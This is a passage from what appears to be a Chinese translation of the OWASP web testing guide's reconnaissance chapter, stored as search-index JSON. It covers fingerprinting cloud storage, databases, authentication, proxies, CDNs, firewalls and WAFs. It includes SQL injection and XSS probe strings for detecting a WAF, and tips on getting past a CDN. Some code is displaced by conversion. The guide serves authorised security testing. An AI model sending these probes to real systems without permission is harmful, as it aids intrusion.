<pre><code>X-Amz-Invocation-Type\nX-Amz-Log-Type\nX-Amz-Client-Context\n</code></pre> <p>Azure Functions \u4e0d\u592a\u660e\u663e\u3002\u5b83\u4eec\u901a\u5e38\u4f1a\u8fd4\u56de<code>Server: Kestrel</code>\u6807\u5934 - \u4f46\u8fd9\u672c\u8eab\u5e76\u4e0d\u8db3\u4ee5\u786e\u4fe1\u5b83\u662f\u4e00\u4e2a Azure \u5e94\u7528\u7a0b\u5e8f\u51fd\u6570\uff0c\u800c\u4e0d\u662f\u5728 Kestrel \u4e0a\u8fd0\u884c\u7684\u4e00\u4e9b\u5176\u4ed6\u4ee3\u7801\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_78","title":"\u5fae\u670d\u52a1","text":"<p>\u5728\u57fa\u4e8e\u5fae\u670d\u52a1\u7684\u67b6\u6784\u4e2d\uff0c\u5e94\u7528\u7a0b\u5e8f API \u7531\u591a\u4e2a\u79bb\u6563\u670d\u52a1\u7ec4\u6210\uff0c\u800c\u4e0d\u662f\u4f5c\u4e3a\u4e00\u4e2a\u6574\u4f53\u5e94\u7528\u7a0b\u5e8f\u8fd0\u884c\u3002\u670d\u52a1\u672c\u8eab\u901a\u5e38\u5728\u5bb9\u5668\u5185\u8fd0\u884c\uff08\u901a\u5e38\u4f7f\u7528 Kubernetes\uff09\uff0c\u5e76\u4e14\u53ef\u4ee5\u4f7f\u7528\u5404\u79cd\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\u548c\u8bed\u8a00\u3002\u5c3d\u7ba1\u5b83\u4eec\u901a\u5e38\u4f4d\u4e8e\u5355\u4e2a API \u7f51\u5173\u548c\u57df\u4e4b\u540e\uff0c\u4f46\u4f7f\u7528\u591a\u79cd\u8bed\u8a00\uff08\u901a\u5e38\u5728\u8be6\u7ec6\u7684\u9519\u8bef\u6d88\u606f\u4e2d\u6307\u51fa\uff09\u53ef\u80fd\u8868\u660e\u6b63\u5728\u4f7f\u7528\u5fae\u670d\u52a1\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_79","title":"\u9759\u6001\u5b58\u50a8","text":"<p>\u8bb8\u591a\u5e94\u7528\u7a0b\u5e8f\u5c06\u9759\u6001\u5185\u5bb9\u5b58\u50a8\u5728\u4e13\u7528\u5b58\u50a8\u5e73\u53f0\u4e0a\uff0c\u800c\u4e0d\u662f\u76f4\u63a5\u6258\u7ba1\u5728\u4e3b Web \u670d\u52a1\u5668\u4e0a\u3002\u4e24\u4e2a\u6700\u5e38\u89c1\u7684\u5e73\u53f0\u662f Amazon \u7684 S3 Buckets \u548c Azure \u7684 Storage Accounts\uff0c\u53ef\u4ee5\u901a\u8fc7\u57df\u540d\u8f7b\u677e\u8bc6\u522b\uff1a</p> <ul> <li>Amazon S3 \u5b58\u50a8\u6876\u662f<code>BUCKET.s3.amazonaws.com</code>\u6216<code>s3.REGION.amazonaws.com/BUCKET</code></li> <li>Azure \u5b58\u50a8\u5e10\u6237\u662f<code>ACCOUNT.blob.core.windows.net</code></li> </ul> <p>\u8fd9\u4e9b\u5b58\u50a8\u5e10\u6237\u901a\u5e38\u4f1a\u66b4\u9732\u654f\u611f\u6587\u4ef6\uff0c\u5982\u6d4b\u8bd5\u4e91\u5b58\u50a8\u6307\u5357\u90e8\u5206\u6240\u8ff0\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_80","title":"\u6570\u636e\u5e93","text":"<p>\u5927\u591a\u6570\u91cd\u8981\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u67d0\u79cd\u6570\u636e\u5e93\u6765\u5b58\u50a8\u52a8\u6001\u5185\u5bb9\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u786e\u5b9a\u6570\u636e\u5e93\uff0c\u5c3d\u7ba1\u5b83\u901a\u5e38\u4f9d\u8d56\u4e8e\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u5176\u4ed6\u95ee\u9898\u3002\u8fd9\u901a\u5e38\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u5b8c\u6210\uff1a</p> <ul> <li>\u7aef\u53e3\u626b\u63cf\u670d\u52a1\u5668\u5e76\u67e5\u627e\u4e0e\u7279\u5b9a\u6570\u636e\u5e93\u5173\u8054\u7684\u4efb\u4f55\u5f00\u653e\u7aef\u53e3\u3002</li> <li>\u89e6\u53d1\u4e0e SQL\uff08\u6216 NoSQL\uff09\u76f8\u5173\u7684\u9519\u8bef\u6d88\u606f\uff08\u6216\u4ece\u641c\u7d22\u5f15\u64ce\u4e2d\u67e5\u627e\u73b0\u6709\u9519\u8bef\u3002</li> </ul> <p>\u5982\u679c\u65e0\u6cd5\u6700\u7ec8\u786e\u5b9a\u6570\u636e\u5e93\uff0c\u60a8\u901a\u5e38\u53ef\u4ee5\u6839\u636e\u5e94\u7528\u7a0b\u5e8f\u7684\u5176\u4ed6\u65b9\u9762\u8fdb\u884c\u6709\u6839\u636e\u7684\u731c\u6d4b\uff1a</p> <ul> <li>Windows\u3001IIS \u548c ASP.NET \u7ecf\u5e38\u4f7f\u7528 Microsoft SQL \u670d\u52a1\u5668\u3002</li> <li>\u5d4c\u5165\u5f0f\u7cfb\u7edf\u901a\u5e38\u4f7f\u7528 SQLite\u3002</li> <li>PHP \u901a\u5e38\u4f7f\u7528 MySQL \u6216 PostgreSQL\u3002</li> <li>APEX \u7ecf\u5e38\u4f7f\u7528 Oracle\u3002</li> </ul> <p>\u8fd9\u4e9b\u4e0d\u662f\u786c\u6027\u89c4\u5b9a\uff0c\u4f46\u5982\u679c\u6ca1\u6709\u66f4\u597d\u7684\u4fe1\u606f\uff0c\u80af\u5b9a\u53ef\u4ee5\u4e3a\u60a8\u63d0\u4f9b\u4e00\u4e2a\u5408\u7406\u7684\u8d77\u70b9\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_81","title":"\u9a8c\u8bc1","text":"<p>\u5927\u591a\u6570\u5e94\u7528\u7a0b\u5e8f\u90fd\u6709\u67d0\u79cd\u5f62\u5f0f\u7684\u7528\u6237\u8eab\u4efd\u9a8c\u8bc1\u3002\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u8eab\u4efd\u9a8c\u8bc1\u540e\u7aef\uff0c\u4f8b\u5982\uff1a</p> <ul> <li>Web \u670d\u52a1\u5668\u914d\u7f6e\uff08\u5305\u62ec<code>.htaccess</code>\u6587\u4ef6\uff09\u6216\u811a\u672c\u4e2d\u7684\u786c\u7f16\u7801\u5bc6\u7801\u3002<ul> <li>\u901a\u5e38\u663e\u793a\u4e3a HTTP \u57fa\u672c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u7531\u6d4f\u89c8\u5668\u4e2d\u7684\u5f39\u51fa\u7a97\u53e3\u548c<code>WWW-Authenticate: Basic</code>HTTP \u6807\u5934\u6307\u793a\u3002</li> </ul> </li> <li>\u6570\u636e\u5e93\u4e2d\u7684\u672c\u5730\u7528\u6237\u5e10\u6237\u3002<ul> <li>\u901a\u5e38\u96c6\u6210\u5230\u5e94\u7528\u7a0b\u5e8f\u7684\u8868\u5355\u6216 API \u7aef\u70b9\u4e2d\u3002</li> </ul> </li> <li>\u73b0\u6709\u7684\u4e2d\u592e\u8eab\u4efd\u9a8c\u8bc1\u6e90\uff0c\u4f8b\u5982 Active Directory \u6216 LDAP \u670d\u52a1\u5668\u3002<ul> <li>\u53ef\u4ee5\u4f7f\u7528 NTLM \u8eab\u4efd\u9a8c\u8bc1\uff0c\u7531<code>WWW-Authenticate: NTLM</code>HTTP \u6807\u5934\u6307\u793a\u3002</li> <li>\u53ef\u4ee5\u4ee5\u4e00\u79cd\u5f62\u5f0f\u96c6\u6210\u5230 Web \u5e94\u7528\u7a0b\u5e8f\u4e2d\u3002</li> <li>\u53ef\u80fd\u9700\u8981\u4ee5\u201cDOMAIN\\username\u201d\u683c\u5f0f\u8f93\u5165\u7528\u6237\u540d\uff0c\u6216\u8005\u53ef\u80fd\u4f1a\u63d0\u4f9b\u53ef\u7528\u57df\u7684\u4e0b\u62c9\u5217\u8868\u3002</li> </ul> </li> <li>\u4e0e\u5185\u90e8\u6216\u5916\u90e8\u63d0\u4f9b\u5546\u7684\u5355\u70b9\u767b\u5f55 (SSO)\u3002<ul> <li>\u901a\u5e38\u4f7f\u7528 OAuth\u3001OpenID Connect \u6216 SAML\u3002</li> </ul> </li> </ul> <p>\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u4e3a\u7528\u6237\u63d0\u4f9b\u591a\u79cd\u8eab\u4efd\u9a8c\u8bc1\u9009\u9879\uff08\u4f8b\u5982\u6ce8\u518c\u672c\u5730\u5e10\u6237\u6216\u4f7f\u7528\u4ed6\u4eec\u73b0\u6709\u7684 Facebook \u5e10\u6237\uff09\uff0c\u5e76\u4e14\u53ef\u80fd\u4f1a\u4e3a\u666e\u901a\u7528\u6237\u548c\u7ba1\u7406\u5458\u4f7f\u7528\u4e0d\u540c\u7684\u673a\u5236\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#api","title":"\u7b2c\u4e09\u65b9\u670d\u52a1\u548c API","text":"<p>\u51e0\u4e4e\u6240\u6709 Web \u5e94\u7528\u7a0b\u5e8f\u90fd\u5305\u542b\u7531\u5ba2\u6237\u7aef\u52a0\u8f7d\u6216\u4e0e\u4e4b\u4ea4\u4e92\u7684\u7b2c\u4e09\u65b9\u8d44\u6e90\u3002\u8fd9\u4e9b\u53ef\u4ee5\u5305\u62ec\uff1a</p> <ul> <li>\u6d3b\u52a8\u5185\u5bb9\uff08\u4f8b\u5982\u811a\u672c\u3001\u6837\u5f0f\u8868\u3001\u5b57\u4f53\u548c iframe\uff09\u3002</li> <li>\u88ab\u52a8\u5185\u5bb9\uff08\u4f8b\u5982\u56fe\u50cf\u548c\u89c6\u9891\uff09\u3002</li> <li>\u5916\u90e8 API\u3002</li> <li>\u793e\u4ea4\u5a92\u4f53\u6309\u94ae\u3002</li> <li>\u5e7f\u544a\u7f51\u7edc\u3002</li> <li>\u652f\u4ed8\u7f51\u5173\u3002</li> </ul> <p>\u8fd9\u4e9b\u8d44\u6e90\u76f4\u63a5\u7531\u7528\u6237\u7684\u6d4f\u89c8\u5668\u8bf7\u6c42\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528\u5f00\u53d1\u4eba\u5458\u5de5\u5177\u6216\u62e6\u622a\u4ee3\u7406\u8f7b\u677e\u8bc6\u522b\u3002\u867d\u7136\u8bc6\u522b\u5b83\u4eec\u5f88\u91cd\u8981\uff08\u56e0\u4e3a\u5b83\u4eec\u4f1a\u5f71\u54cd\u5e94\u7528\u7a0b\u5e8f\u7684\u5b89\u5168\u6027\uff09\uff0c\u4f46\u8bf7\u8bb0\u4f4f_\u5b83\u4eec\u901a\u5e38\u4e0d\u5728\u6d4b\u8bd5\u8303\u56f4\u5185_\uff0c\u56e0\u4e3a\u5b83\u4eec\u5c5e\u4e8e\u7b2c\u4e09\u65b9\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_82","title":"\u7f51\u7edc\u7ec4\u4ef6","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_83","title":"\u53cd\u5411\u4ee3\u7406","text":"<p>\u53cd\u5411\u4ee3\u7406\u4f4d\u4e8e\u4e00\u4e2a\u6216\u591a\u4e2a\u540e\u7aef\u670d\u52a1\u5668\u4e4b\u524d\uff0c\u5e76\u5c06\u8bf7\u6c42\u91cd\u5b9a\u5411\u5230\u9002\u5f53\u7684\u76ee\u7684\u5730\u3002\u5b83\u4eec\u53ef\u4ee5\u5b9e\u73b0\u5404\u79cd\u529f\u80fd\uff0c\u4f8b\u5982\uff1a</p> <ul> <li>\u5145\u5f53\u8d1f\u8f7d\u5e73\u8861\u5668\u6216Web \u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899\u3002</li> <li>\u5141\u8bb8\u591a\u4e2a\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u5355\u4e2a IP \u5730\u5740\u6216\u57df\uff08\u5728\u5b50\u6587\u4ef6\u5939\u4e2d\uff09\u3002</li> <li>\u5b9e\u65bd IP \u8fc7\u6ee4\u6216\u5176\u4ed6\u9650\u5236\u3002</li> <li>\u4ece\u540e\u7aef\u7f13\u5b58\u5185\u5bb9\u4ee5\u63d0\u9ad8\u6027\u80fd\u3002</li> </ul> <p>\u5e76\u975e\u603b\u80fd\u68c0\u6d4b\u5230\u53cd\u5411\u4ee3\u7406\uff08\u7279\u522b\u662f\u5982\u679c\u5b83\u540e\u9762\u53ea\u6709\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff09\uff0c\u4f46\u6709\u65f6\u60a8\u901a\u5e38\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u8bc6\u522b\u5b83\uff1a</p> <ul> <li>\u524d\u7aef\u670d\u52a1\u5668\u548c\u540e\u7aef\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u7684\u4e0d\u5339\u914d\uff08\u4f8b\u5982<code>Server: nginx</code>\u5e26\u6709 ASP.NET \u5e94\u7528\u7a0b\u5e8f\u7684\u6807\u5934\uff09\u3002<ul> <li>\u8fd9\u6709\u65f6\u4f1a\u5bfc\u81f4\u8bf7\u6c42\u8d70\u79c1\u6f0f\u6d1e\u3002</li> </ul> </li> <li>\u91cd\u590d\u7684\u6807\u5934\uff08\u5c24\u5176\u662f<code>Server</code>\u6807\u5934\uff09\u3002</li> <li>\u5728\u540c\u4e00 IP \u5730\u5740\u6216\u57df\u4e0a\u6258\u7ba1\u591a\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff08\u5c24\u5176\u662f\u5f53\u5b83\u4eec\u4f7f\u7528\u4e0d\u540c\u8bed\u8a00\u65f6\uff09\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_84","title":"\u8d1f\u8f7d\u5747\u8861\u5668","text":"<p>\u8d1f\u8f7d\u5747\u8861\u5668\u4f4d\u4e8e\u591a\u4e2a\u540e\u7aef\u670d\u52a1\u5668\u4e4b\u524d\uff0c\u5e76\u5728\u5b83\u4eec\u4e4b\u95f4\u5206\u914d\u8bf7\u6c42\uff0c\u4ee5\u4fbf\u4e3a\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u66f4\u5927\u7684\u5197\u4f59\u548c\u5904\u7406\u80fd\u529b\u3002</p> <p>\u8d1f\u8f7d\u5747\u8861\u5668\u53ef\u80fd\u96be\u4ee5\u68c0\u6d4b\uff0c\u4f46\u6709\u65f6\u53ef\u4ee5\u901a\u8fc7\u53d1\u51fa\u591a\u4e2a\u8bf7\u6c42\u5e76\u68c0\u67e5\u54cd\u5e94\u7684\u5dee\u5f02\u6765\u8bc6\u522b\uff0c\u4f8b\u5982\uff1a</p> <ul> <li>\u7cfb\u7edf\u65f6\u95f4\u4e0d\u4e00\u81f4\u3002</li> <li>\u8be6\u7ec6\u9519\u8bef\u6d88\u606f\u4e2d\u7684\u4e0d\u540c\u5185\u90e8 IP \u5730\u5740\u6216\u4e3b\u673a\u540d\u3002</li> <li>\u4ece\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020 (SSRF)\u8fd4\u56de\u7684\u4e0d\u540c\u5730\u5740\u3002</li> </ul> <p>\u5b83\u4eec\u4e5f\u53ef\u4ee5\u901a\u8fc7\u7279\u5b9a cookie \u7684\u5b58\u5728\u6765\u6307\u793a\uff08\u4f8b\u5982\uff0cF5 BIG-IP \u8d1f\u8f7d\u5e73\u8861\u5668\u5c06\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a<code>BIGipServer</code>.</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#cdn","title":"\u5185\u5bb9\u5206\u53d1\u7f51\u7edc (CDN)","text":"<p>\u5185\u5bb9\u5206\u53d1\u7f51\u7edc (CDN) \u662f\u4e00\u7ec4\u5730\u7406\u5206\u5e03\u7684\u7f13\u5b58\u4ee3\u7406\u670d\u52a1\u5668\uff0c\u65e8\u5728\u63d0\u9ad8\u7f51\u7ad9\u6027\u80fd\uff0c\u4e3a\u7f51\u7ad9\u63d0\u4f9b\u989d\u5916\u7684\u5f39\u6027\u3002</p> <p>\u5b83\u901a\u5e38\u901a\u8fc7\u5c06\u9762\u5411\u516c\u4f17\u7684\u57df\u6307\u5411 CDN \u7684\u670d\u52a1\u5668\uff0c\u7136\u540e\u914d\u7f6e CDN \u4ee5\u8fde\u63a5\u5230\u6b63\u786e\u7684\u540e\u7aef\u670d\u52a1\u5668\uff08\u6709\u65f6\u79f0\u4e3a\u201c\u6e90\u201d\uff09\u6765\u914d\u7f6e\u3002</p> <p>\u68c0\u6d4b CDN \u7684\u6700\u7b80\u5355\u65b9\u6cd5\u662f\u5bf9\u57df\u89e3\u6790\u5230\u7684 IP \u5730\u5740\u6267\u884c WHOIS \u67e5\u8be2\u3002\u5982\u679c\u4ed6\u4eec\u5c5e\u4e8e CDN \u516c\u53f8\uff08\u4f8b\u5982 Akamai\u3001Cloudflare \u6216 Fastly - \u8bf7\u53c2\u9605\u7ef4\u57fa\u767e\u79d1\u4ee5\u83b7\u53d6\u66f4\u5b8c\u6574\u7684\u5217\u8868\uff09\uff0c\u90a3\u4e48\u5c31\u597d\u50cf\u6b63\u5728\u4f7f\u7528 CDN\u3002</p> <p>\u5728 CDN \u540e\u9762\u6d4b\u8bd5\u7ad9\u70b9\u65f6\uff0c\u60a8\u5e94\u8be5\u7262\u8bb0\u4ee5\u4e0b\u51e0\u70b9\uff1a</p> <ul> <li>IP \u548c\u670d\u52a1\u5668\u5c5e\u4e8e CDN \u63d0\u4f9b\u5546\uff0c\u5f88\u53ef\u80fd\u4e0d\u5728\u57fa\u7840\u8bbe\u65bd\u6d4b\u8bd5\u8303\u56f4\u5185\u3002</li> <li>\u8bb8\u591a CDN \u8fd8\u5305\u62ec\u673a\u5668\u4eba\u68c0\u6d4b\u3001\u901f\u7387\u9650\u5236\u548c Web \u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899\u7b49\u529f\u80fd\u3002</li> <li>CDN \u901a\u5e38\u7f13\u5b58\u5185\u5bb9\uff0c\u56e0\u6b64\u5bf9\u540e\u7aef\u7f51\u7ad9\u6240\u505a\u7684\u4efb\u4f55\u66f4\u6539\u53ef\u80fd\u4e0d\u4f1a\u7acb\u5373\u663e\u793a\u3002</li> </ul> <p>\u5982\u679c\u8be5\u7ad9\u70b9\u4f4d\u4e8e CDN \u540e\u9762\uff0c\u5219\u8bc6\u522b\u540e\u7aef\u670d\u52a1\u5668\u4f1a\u5f88\u6709\u7528\u3002\u5982\u679c\u4ed6\u4eec\u6ca1\u6709\u5b9e\u65bd\u9002\u5f53\u7684\u8bbf\u95ee\u63a7\u5236\uff0c\u90a3\u4e48\u60a8\u53ef\u4ee5\u901a\u8fc7\u76f4\u63a5\u8bbf\u95ee\u540e\u7aef\u670d\u52a1\u5668\u6765\u7ed5\u8fc7 CDN\uff08\u53ca\u5176\u63d0\u4f9b\u7684\u4efb\u4f55\u4fdd\u62a4\uff09\u3002\u6709\u591a\u79cd\u4e0d\u540c\u7684\u65b9\u6cd5\u53ef\u4ee5\u8ba9\u60a8\u8bc6\u522b\u540e\u7aef\u7cfb\u7edf\uff1a</p> <ul> <li>\u5e94\u7528\u7a0b\u5e8f\u53d1\u9001\u7684\u7535\u5b50\u90ae\u4ef6\u53ef\u80fd\u76f4\u63a5\u6765\u81ea\u540e\u7aef\u670d\u52a1\u5668\uff0c\u8fd9\u53ef\u80fd\u4f1a\u6cc4\u9732\u5176 IP \u5730\u5740\u3002</li> <li>\u57df\u7684 DNS \u7814\u78e8\u3001\u533a\u57df\u4f20\u8f93\u6216\u8bc1\u4e66\u900f\u660e\u5217\u8868\u53ef\u80fd\u4f1a\u5728\u5b50\u57df\u4e0a\u663e\u793a\u5b83\u3002</li> <li>\u626b\u63cf\u516c\u53f8\u5df2\u77e5\u4f7f\u7528\u7684 IP \u8303\u56f4\u53ef\u80fd\u4f1a\u627e\u5230\u540e\u7aef\u670d\u52a1\u5668\u3002</li> <li>\u5229\u7528\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020 (SSRF)\u53ef\u80fd\u4f1a\u6cc4\u9732 IP \u5730\u5740\u3002</li> <li>\u6765\u81ea\u5e94\u7528\u7a0b\u5e8f\u7684\u8be6\u7ec6\u9519\u8bef\u6d88\u606f\u53ef\u80fd\u4f1a\u66b4\u9732 IP \u5730\u5740\u6216\u4e3b\u673a\u540d\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_85","title":"\u5b89\u5168\u7ec4\u4ef6","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_86","title":"\u7f51\u7edc\u9632\u706b\u5899","text":"<p>\u5927\u591a\u6570 Web \u670d\u52a1\u5668\u5c06\u53d7\u5230\u6570\u636e\u5305\u8fc7\u6ee4\u6216\u72b6\u6001\u68c0\u6d4b\u9632\u706b\u5899\u7684\u4fdd\u62a4\uff0c\u8fd9\u4e9b\u9632\u706b\u5899\u4f1a\u963b\u6b62\u4efb\u4f55\u4e0d\u9700\u8981\u7684\u7f51\u7edc\u6d41\u91cf\u3002\u8981\u68c0\u6d4b\u5230\u8fd9\u4e00\u70b9\uff0c\u8bf7\u5bf9\u670d\u52a1\u5668\u6267\u884c\u7aef\u53e3\u626b\u63cf\u5e76\u68c0\u67e5\u7ed3\u679c\u3002</p> <p>\u5982\u679c\u5927\u591a\u6570\u7aef\u53e3\u663e\u793a\u4e3a\u201c\u5173\u95ed\u201d\uff08\u5373\uff0c\u5b83\u4eec\u8fd4\u56de\u4e00\u4e2a<code>RST</code>\u6570\u636e\u5305\u4ee5\u54cd\u5e94\u521d\u59cb<code>SYN</code>\u6570\u636e\u5305\uff09\uff0c\u5219\u8fd9\u8868\u660e\u670d\u52a1\u5668\u53ef\u80fd\u4e0d\u53d7\u9632\u706b\u5899\u4fdd\u62a4\u3002\u5982\u679c\u7aef\u53e3\u663e\u793a\u4e3a\u201c\u5df2\u8fc7\u6ee4\u201d\uff08\u5373\uff0c\u5c06\u6570\u636e\u5305\u53d1\u9001\u5230\u672a\u4f7f\u7528\u7684\u7aef\u53e3\u65f6\u672a\u6536\u5230\u54cd\u5e94<code>SYN</code>\uff09\uff0c\u5219\u5f88\u53ef\u80fd\u5b58\u5728\u9632\u706b\u5899\u3002</p> <p>\u6b64\u5916\uff0c\u5982\u679c\u5411\u4e16\u754c\u516c\u5f00\u4e86\u4e0d\u9002\u5f53\u7684\u670d\u52a1\uff08\u4f8b\u5982 SMTP\u3001IMAP\u3001MySQL \u7b49\uff09\uff0c\u8fd9\u8868\u660e\u8981\u4e48\u6ca1\u6709\u9002\u5f53\u7684\u9632\u706b\u5899\uff0c\u8981\u4e48\u9632\u706b\u5899\u914d\u7f6e\u4e0d\u5f53\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_87","title":"\u7f51\u7edc\u5165\u4fb5\u68c0\u6d4b\u4e0e\u9632\u5fa1\u7cfb\u7edf","text":"<p>\u7f51\u7edc\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf (IDS) \u68c0\u6d4b\u53ef\u7591\u6216\u6076\u610f\u7684\u7f51\u7edc\u7ea7\u6d3b\u52a8\uff08\u4f8b\u5982\u7aef\u53e3\u6216\u6f0f\u6d1e\u626b\u63cf\uff09\u5e76\u53d1\u51fa\u8b66\u62a5\u3002\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf (IPS) \u4e0e\u6b64\u7c7b\u4f3c\uff0c\u4f46\u4e5f\u4f1a\u91c7\u53d6\u63aa\u65bd\u963b\u6b62\u6d3b\u52a8 - \u901a\u5e38\u662f\u901a\u8fc7\u963b\u6b62\u6e90 IP \u5730\u5740\u3002</p> <p>\u901a\u5e38\u53ef\u4ee5\u901a\u8fc7\u9488\u5bf9\u76ee\u6807\u8fd0\u884c\u81ea\u52a8\u626b\u63cf\u5de5\u5177\uff08\u4f8b\u5982\u7aef\u53e3\u626b\u63cf\u5668\uff09\u5e76\u67e5\u770b\u6e90 IP \u662f\u5426\u88ab\u963b\u6b62\u6765\u68c0\u6d4b IPS\u3002\u7136\u800c\uff0c\u8bb8\u591a\u5e94\u7528\u7a0b\u5e8f\u7ea7\u5de5\u5177\u53ef\u80fd\u65e0\u6cd5\u88ab IPS \u68c0\u6d4b\u5230\uff08\u7279\u522b\u662f\u5982\u679c\u5b83\u4e0d\u89e3\u5bc6 TLS\uff09\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#web-waf","title":"Web \u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899 (WAF)","text":"<p>Web \u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899 (WAF) \u68c0\u67e5 HTTP \u8bf7\u6c42\u7684\u5185\u5bb9\u5e76\u963b\u6b62\u90a3\u4e9b\u770b\u4f3c\u53ef\u7591\u6216\u6076\u610f\u7684\u8bf7\u6c42\uff0c\u6216\u52a8\u6001\u5e94\u7528\u5176\u4ed6\u63a7\u5236\uff0c\u4f8b\u5982 CAPTCHA \u6216\u901f\u7387\u9650\u5236\u3002\u5b83\u4eec\u901a\u5e38\u57fa\u4e8e\u4e00\u7ec4\u5df2\u77e5\u7684\u9519\u8bef\u7b7e\u540d\u548c\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u4f8b\u5982OWASP \u6838\u5fc3\u89c4\u5219\u96c6\u3002WAF \u53ef\u4ee5\u6709\u6548\u5730\u9632\u8303\u67d0\u4e9b\u7c7b\u578b\u7684\u653b\u51fb\uff08\u4f8b\u5982 SQL \u6ce8\u5165\u6216\u8de8\u7ad9\u70b9\u811a\u672c\uff09\uff0c\u4f46\u5bf9\u5176\u4ed6\u7c7b\u578b\u7684\u653b\u51fb\uff08\u4f8b\u5982\u8bbf\u95ee\u63a7\u5236\u6216\u4e1a\u52a1\u903b\u8f91\u76f8\u5173\u95ee\u9898\uff09\u5219\u6548\u679c\u8f83\u5dee\u3002</p> <p>WAF \u53ef\u4ee5\u90e8\u7f72\u5728\u591a\u4e2a\u4f4d\u7f6e\uff0c\u5305\u62ec\uff1a</p> <ul> <li>\u5728 Web \u670d\u52a1\u5668\u672c\u8eab\u4e0a\u3002</li> <li>\u5728\u5355\u72ec\u7684\u865a\u62df\u673a\u6216\u786c\u4ef6\u8bbe\u5907\u4e0a\u3002</li> <li>\u5728\u540e\u7aef\u670d\u52a1\u5668\u524d\u9762\u7684\u4e91\u7aef\u3002</li> </ul> <p>\u56e0\u4e3aWAF\u62e6\u622a\u4e86\u6076\u610f\u8bf7\u6c42\uff0c\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u5728\u53c2\u6570\u4e2d\u52a0\u5165\u5e38\u89c1\u7684\u653b\u51fb\u5b57\u7b26\u4e32\uff0c\u89c2\u5bdf\u662f\u5426\u88ab\u62e6\u622a\u6765\u68c0\u6d4b\u3002\u4f8b\u5982\uff0c\u5c1d\u8bd5\u6dfb\u52a0\u4e00\u4e2a\u540d\u4e3a\u6216<code>foo</code>\u4e4b\u7c7b\u7684\u53c2\u6570\u3002\u5982\u679c\u8fd9\u4e9b\u8bf7\u6c42\u88ab\u963b\u6b62\uff0c\u5219\u8868\u660e\u53ef\u80fd\u5b58\u5728 WAF\u3002\u6b64\u5916\uff0c\u5757\u9875\u9762\u7684\u5185\u5bb9\u53ef\u4ee5\u63d0\u4f9b\u6709\u5173\u6b63\u5728\u4f7f\u7528\u7684\u7279\u5b9a\u6280\u672f\u7684\u4fe1\u606f\u3002\u6700\u540e\uff0c\u67d0\u4e9b WAF \u53ef\u80fd\u4f1a\u5c06 cookie \u6216 HTTP \u6807\u5934\u6dfb\u52a0\u5230\u53ef\u4ee5\u663e\u793a\u5176\u5b58\u5728\u7684\u54cd\u5e94\u4e2d\u3002<code>' UNION SELECT 1``&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p> <p>\u5982\u679c\u6b63\u5728\u4f7f\u7528\u57fa\u4e8e\u4e91\u7684 